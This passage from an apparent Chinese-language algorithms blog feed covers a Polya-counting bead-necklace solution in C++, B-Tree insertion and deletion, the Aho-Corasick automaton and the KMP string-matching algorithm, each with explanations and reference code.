= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">1</span>; d * d &lt;= n; ++d) &#123;</span><br><span class="line"><span class="keyword">if</span> (n % d) <span class="keyword">continue</span>;</span><br><span class="line">inc(ans, f(n, d, a));</span><br><span class="line"><span class="keyword">if</span> (d * d != n) </span><br><span class="line">inc(ans, f(n, n / d, a));</span><br><span class="line">&#125;</span><br><span class="line">ans = ans * inv(n) % P;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Birthday-Toy-1"><a href="#Birthday-Toy-1" class="headerlink" title="Birthday Toy"></a>Birthday Toy</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">31625</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prime;</span><br><span class="line"><span class="keyword">bool</span> isprime[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">inc</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((x += y) &gt;= P) x -= P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kpow</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">a %= P;</span><br><span class="line"><span class="keyword">int</span> r = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (b &amp; <span class="number">1</span>) r = <span class="number">1l</span>l * r * a % P;</span><br><span class="line">a = <span class="number">1l</span>l * a * a % P, b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> a[M][M];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">rep(i, <span class="number">0</span>, M) rep(j, <span class="number">0</span>, M)</span><br><span class="line">a[i][j] = i == j ? x : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Matrix <span class="keyword">operator</span>*(<span class="keyword">const</span> Matrix &amp;mat) <span class="keyword">const</span> &#123;</span><br><span class="line">Matrix r; r.init(<span class="number">0</span>);</span><br><span class="line">rep(i, <span class="number">0</span>, M) rep(j, <span class="number">0</span>, M) rep(k, <span class="number">0</span>, M)</span><br><span class="line">inc(r.a[i][j], <span class="number">1l</span>l * a[i][k] * mat.a[k][j] % P);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">Matrix <span class="keyword">operator</span>^(<span class="keyword">int</span> n) &#123;</span><br><span class="line">Matrix r, a = *<span class="keyword">this</span>;</span><br><span class="line">r.init(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &amp; <span class="number">1</span>) r = r * a;</span><br><span class="line">a = a * a, n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initPrime</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(isprime, <span class="literal">true</span>, <span class="keyword">sizeof</span>(isprime));</span><br><span class="line">isprime[<span class="number">0</span>] = isprime[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">rep(i, <span class="number">2</span>, N) &#123;</span><br><span class="line"><span class="keyword">if</span> (isprime[i]) prime.push_back(i);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; i * prime[j] &lt; N; ++j) &#123;</span><br><span class="line">isprime[i * prime[j]] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (i % prime[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">phi</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = n;</span><br><span class="line">rep(i, <span class="number">0</span>, sz(prime)) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; prime[i]) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (n % prime[i] == <span class="number">0</span>) &#123;</span><br><span class="line">ret -= ret / prime[i];</span><br><span class="line"><span class="keyword">while</span> (n % prime[i] == <span class="number">0</span>)</span><br><span class="line">n /= prime[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) ret -= ret / n;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span> d, Matrix &amp;a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">1l</span>l * m * (a ^ d).a[<span class="number">0</span>][<span class="number">0</span>] % P;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1l</span>l * fd * phi(n / d) % P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">initPrime();</span><br><span class="line"><span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;k)) &#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> m = k - <span class="number">1</span>; <span class="comment">// #color for small beads</span></span><br><span class="line">Matrix a;</span><br><span class="line">a.a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>, a.a[<span class="number">0</span>][<span class="number">1</span>] = m - <span class="number">1</span>;</span><br><span class="line">a.a[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>, a.a[<span class="number">1</span>][<span class="number">1</span>] = m - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">1</span>; d * d &lt;= n; ++d) &#123;</span><br><span class="line"><span class="keyword">if</span> (n % d) <span class="keyword">continue</span>;</span><br><span class="line">inc(ans, f(n, m, d, a));</span><br><span class="line"><span class="keyword">if</span> (d * d != n)</span><br><span class="line">inc(ans, f(n, m, n / d, a));</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="number">1l</span>l * ans * kpow(n, P - <span class="number">2</span>) % P;</span><br><span class="line">ans = <span class="number">1l</span>l * ans * k % P;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Richard A. Brualdi. 组合数学 [M].  机械工业出版社, 2012</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Necklace-of-Beads&quot;&gt;&lt;a href=&quot;#Necklace-of-Beads&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="polya" scheme="http://mcginn7.github.io/tags/polya/"/>
    
  </entry>
  
  <entry>
    <title>B-Tree</title>
    <link href="http://mcginn7.github.io/2019/07/22/B-Tree/"/>
    <id>http://mcginn7.github.io/2019/07/22/B-Tree/</id>
    <published>2019-07-22T04:05:58.000Z</published>
    <updated>2019-07-22T04:09:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单来说，B-Tree 是针对<strong>大数据存取</strong>的平衡树，考虑了<strong>磁盘读取</strong>对查找效率的影响。</p><p>B-Tree 的主要思想是通过<strong>减少磁盘读取次数</strong>来提高数据存取性能，而磁盘读取次数与<strong>树高</strong>相关。故B-Tree 允许每个节点拥有多于 2 个的子节点来减小树高。</p><p>与二叉平衡树类似，B-Tree 中的每个节点存储若干键值（keys）以及子节点地址。</p><img src="/2019/07/22/B-Tree/struct.png"><center>图 1. B-Tree 结构图</center><h2 id="定义和性质"><a href="#定义和性质" class="headerlink" title="定义和性质"></a>定义和性质</h2><p><strong>阶（order）</strong>：将子节点的允许最大数量定义为阶，如图 1 为 5 阶树。</p><p>$m$ 阶的 B-Tree 满足以下定义：</p><ol><li>每个节点最多能有 $m$ 个子节点。</li><li>每个内部节点至少有 $\lceil \frac m2\rceil$ 个子节点，内部节点（Internal nodes）为除根节点和叶节点以外的节点。</li><li>拥有 $k+1$ 个子节点的非叶节点存有 $k$ 个键值。</li><li>每个节点中的键值按<strong>递增</strong>排序。</li><li>所有的叶节点高度一样。</li></ol><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>对于平衡🌳的操作主要就是<strong>插入（Insertion）</strong>和<strong>删除（Deletion）</strong>。</p><p>以下操作均<strong>基于键值两两不同的假设</strong>进行讨论，同时键值的<strong>数量范围</strong>定义为 $[d, 2d]$，阶 $m=2d+1$。</p><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>首先找到键值归属的<strong>叶节点</strong>，插入到该节点中，节点的键值数量可能超过上限 $2d$，即当前键值数量为 $2d+1$。</p><p>此时用<strong>中位数</strong>将该节点划分成两个新的节点，每个新节点含有 $d$ 个键值，如图 2 所示。</p><p>之后将键值中位数插入到父节点中，父节点的键值数量 +1，也有可能超上限，故需要<strong>迭代</strong>更新。</p><img src="/2019/07/22/B-Tree/split.png"><center>图 2. 节点分裂</center><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><h4 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h4><p>将内部节点中的删除操作转移至叶节点中，然后自下而上重新平衡，达到键值数量要求。</p><h4 id="叶节点"><a href="#叶节点" class="headerlink" title="叶节点"></a>叶节点</h4><p>直接将对应的键值删除即可。</p><h4 id="内部节点"><a href="#内部节点" class="headerlink" title="内部节点"></a>内部节点</h4><p>假设当前删除键值为 $k$，则 $k$  的前继 $prev(k)$ 为左子树中的最大键值，后继 $succ(k)$ 为右子树中的最小键值。</p><p>$prev(k)$ 和 $succ(k)$ 均可替代 $k$ 作为分割左、右子树的新键值，同时这两个键值必然在叶节点中，进而将删除操作转移到叶节点中。</p><h4 id="重平衡"><a href="#重平衡" class="headerlink" title="重平衡"></a>重平衡</h4><p>在叶节点删除键值后可能出现键值数量为 $d-1$ 导致下溢出。此时通过转移<strong>兄弟节点</strong>的键值来完成键值补充，主要分两种情况：</p><ol><li><p><strong>合并</strong>：当前节点的左、右兄弟节点均只有 $d$ 个键值，此时可与其中一个兄弟节点及父节点中的分割键值合并，新节点的键值数量为 $2d$，相当于节点分裂的逆操作。此时父节点的键值数量减 1，需要<strong>迭代</strong>重平衡。</p><img src="/2019/07/22/B-Tree/merge.png"><center>图 3. 节点合并</center></li><li><p><strong>旋转</strong>：假设右兄弟节点的键值大于 $d$ 个（左兄弟同理），将父节点的分割键值插入到当前节点中，右兄弟节点的第 1 个键值插入到父节点中。此时当前节点、兄弟节点和父节点的键值数量均满足键值数量要求，完成平衡操作。</p><img src="/2019/07/22/B-Tree/rotate.png"><center>图 4. 旋转操作</center></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://en.wikipedia.org/wiki/B-tree" target="_blank" rel="noopener">wikipeadia</a></li><li><a href="https://www.geeksforgeeks.org/b-tree-set-1-introduction-2/" target="_blank" rel="noopener">geeksforgeeks</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;简单来说，B-Tree 是针对&lt;strong&gt;大数据存取&lt;/strong&gt;的平衡树，考虑了&lt;strong&gt;磁盘读取&lt;/strong&gt;对查找效
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AhoCorasick Algorithm</title>
    <link href="http://mcginn7.github.io/2019/05/31/AhoCorasick-Algorithm/"/>
    <id>http://mcginn7.github.io/2019/05/31/AhoCorasick-Algorithm/</id>
    <published>2019-05-31T02:23:33.000Z</published>
    <updated>2019-06-01T02:09:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>AhoCorasick 算法（简称 AC 自动机），解决多模式串的字符匹配问题，即给定若干个单词串 $W_i$，求在文本串 $T$ 中的出现位置。KMP 算法解决单模式串的字符匹配，所以 AC 自动机可认为是 KMP 算法的扩展。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><ul><li>字典树（Trie）：树上任意节点到根的路径所构成的子串，记为 $S(u)$，都是某个插入串的<strong>前缀</strong>。</li><li>KMP 算法：利用最长前后缀完成线性匹配。</li></ul><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>AhoCorasick 本质上与 KMP 算法是一样的，都是通过相同前后缀减少重复计算问题，只是数据结构不同。</p><p>对应于 KMP，AC 自动机需要构建<strong>最长公共前后缀</strong>（LCPS，Longese Common proper Prefix and Suffix），即对于树上任意节点 $u$，找出<strong>最大树深</strong>的节点 $v$，满足 $S(v)$ 是 $S(u)$ 的<strong>真后缀</strong>。因为字典树上的任意节点 $x$ 所表示的 $S(x)$ 都是前缀，故起名最长公共前后缀。</p><p>通常将节点 $v$ 记为 $fail(u)$，表示串 $S(u)$ 失配时的跳转节点，出于可读性的考虑，本文记为 $lcps(u)$。</p><p>$lcps(u)$  的<strong>构建过程</strong>：记节点 $u$ 的父节点为 $f(u)$，与其连边的字符为 $c$。若 $lcps(f(u))$ 存在 $c$ 的出边，则 $lcps(u)=trans(lcps(f(u)), c)$。否则继续找 $lcps(lcps(f(u)))$，直至找到或到达根节点（说明未找到）。</p><img src="/2019/05/31/AhoCorasick-Algorithm/20190601092923.png"><center>图 1. lcps(u) 的构建</center><h2 id="检索过程"><a href="#检索过程" class="headerlink" title="检索过程"></a>检索过程</h2><p>假设已知 $lcps(u)$，且字典树节点 $u$ 与文本串 $T[0:i]$ 匹配，即 $T[i-|S(u)|+1:i] = S(u)$。继续匹配有两种情形：</p><ol><li><p>$trans(u, T[i+1]) \neq NULL$，则匹配长度 +1。</p></li><li><p>$trans(u, T[i+1])=NULL$，与 KMP 类似，在字典树中找出最大深度（即最长前缀）的节点 $v$，满足 $S(v)$ 是 $S(u)$ 的真后缀，同时 $trans(v, T[i+1])\neq NULL$。</p><p>令 $v = lcps(u)$，判断是否能匹配，否则继续判断 $lcps(lcps(u))$。</p></li></ol><h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">5e5</span> + <span class="number">7</span>; <span class="comment">// sum(|Wi|)</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> E = <span class="number">26</span>; <span class="comment">// character set size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AhoCorasick</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> root = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n, lcps[N], trans[N][E];</span><br><span class="line">    <span class="keyword">int</span> end[N]; <span class="comment">// end[u] &gt; 0 : S(u) = Wi</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">new_node</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(trans[n], <span class="number">0</span>, E * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));    </span><br><span class="line">        lcps[n] = root, end[n] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        n = <span class="number">0</span>;</span><br><span class="line">        root = new_node();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> u = root; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = str[i] - <span class="string">'a'</span>;</span><br><span class="line">            <span class="keyword">if</span> (!trans[u][c])</span><br><span class="line">                trans[u][c] = new_node();</span><br><span class="line">            u = trans[u][c];</span><br><span class="line">        &#125;</span><br><span class="line">        ++end[u];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LCPS</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; Q(&#123;root&#125;);</span><br><span class="line">        <span class="keyword">while</span> (!Q.empty()) &#123;</span><br><span class="line">            <span class="keyword">int</span> u = Q.front(); Q.pop();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; E; ++c) &#123;</span><br><span class="line">                <span class="keyword">if</span> (trans[u][c]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v = lcps[u];    </span><br><span class="line">                    <span class="keyword">while</span> (v != root &amp;&amp; !trans[v][c])</span><br><span class="line">                        v = lcps[v];</span><br><span class="line">                    lcps[trans[u][c]] = u == root ? </span><br><span class="line">                        root : trans[v][c]; </span><br><span class="line">                    Q.push(trans[u][c]);</span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    trans[u][c] = trans[lcps[u]][c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;AhoCorasick 算法（简称 AC 自动机），解决多模式串的字符匹配问题，即给定若干个单词串 $W_i$，求在文本串 $T$ 中的出现
      
    
    </summary>
    
    
      <category term="AhoCorasick" scheme="http://mcginn7.github.io/tags/AhoCorasick/"/>
    
      <category term="AC自动机" scheme="http://mcginn7.github.io/tags/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Knuth-Morris-Pratt Algorithm</title>
    <link href="http://mcginn7.github.io/2019/05/24/Knuth-Morris-Pratt-Algorithm/"/>
    <id>http://mcginn7.github.io/2019/05/24/Knuth-Morris-Pratt-Algorithm/</id>
    <published>2019-05-24T15:39:27.000Z</published>
    <updated>2019-07-26T08:50:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>KMP 算法解决在文本串（text）快速找出单词（word）的所有出现位置。</p><p>暴力匹配的时间复杂度为 $O(|T||W|)$，而 KMP 算法通过引入<strong>最长前后缀</strong>，将检索的时间复杂度降至线性。</p><h2 id="最长前后缀"><a href="#最长前后缀" class="headerlink" title="最长前后缀"></a>最长前后缀</h2><blockquote><p>lps indicates longest proper prefix which is also suffix.</p></blockquote><p>最长前后缀（<strong>LPS, Longest proper Prefix and Suffix</strong>）表示既是原串 $S$ 的真前缀也是后缀的最长子串 $T$，其中 $|T|\lt |S|$。</p><script type="math/tex; mode=display">LPS(aaa) = aa \\LPS(abcdab)=ab</script><h2 id="检索过程"><a href="#检索过程" class="headerlink" title="检索过程"></a>检索过程</h2><p>假设已知<strong>单词串</strong>的每个前缀 $W[0: i]$ 的最长前后缀长度 $lps(i)$，且已经匹配 $T[i - j: i] = W[0:j]$。继续匹配有两种情形：</p><ol><li>$T[i+1]=W[j + 1]$，则匹配长度 +1。</li><li>$T[i+ 1] \neq W[j+1]$，此时显然要重新找单词串的一个<strong>最长</strong>前缀 $W[0:k], k\lt j$，使得 $T[i-k:i]=W[0:k]$ 且 $T[i + 1]=W[k+ 1]$，继续与 $i+1$ 结尾的文本串匹配。</li></ol><img src="/2019/05/24/Knuth-Morris-Pratt-Algorithm/1555835282553.png" title="情形 2 示意图"><p><center>图 1. 情形 2 示意图。虚线框表示相同部分。</center><br>此时 $W[0:k]$ 与 $W[0:j]$ 的后缀相同，同时其本身是前缀。</p><p>令 $k=lps(j)$，若 $T[i+1]=W[k+1]$，则继续匹配。否则将 $k$ 视为新的 $j$，则转化成情形 2 相同的子问题。</p><p><strong>时间复杂度</strong>：匹配成功的复杂度是线性的。而匹配失败时会减小单词串的前缀长度，减一长度<strong>至少</strong>对应一次的成功匹配，此时时间复杂度也是线性的。故算法总的时间复杂度是线性的。</p><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>对于单词串的最长前后缀 $lps(i)$，本质上是单词串的自我匹配，即<strong>此时文本串为单词串</strong>。对应于检索过程中的两种情形，可以很容易地完成 $lps(i)$ 的构造。</p><h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// n = |T|, m = |W|, index = [0, n)</span></span><br><span class="line">lps[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">-1</span>; i &lt; m; ++i) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; W[i] != W[j + <span class="number">1</span>])</span><br><span class="line">j = lps[j];</span><br><span class="line">j += W[i] == W[j + <span class="number">1</span>];</span><br><span class="line">lps[i] = j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">-1</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; T[i] != W[j + <span class="number">1</span>])</span><br><span class="line">j = lps[j];</span><br><span class="line">j += T[i] == W[j + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (j == m - <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// match successfully</span></span><br><span class="line">j = lps[j];</span><br><span class="line">&#125;</span><br><span 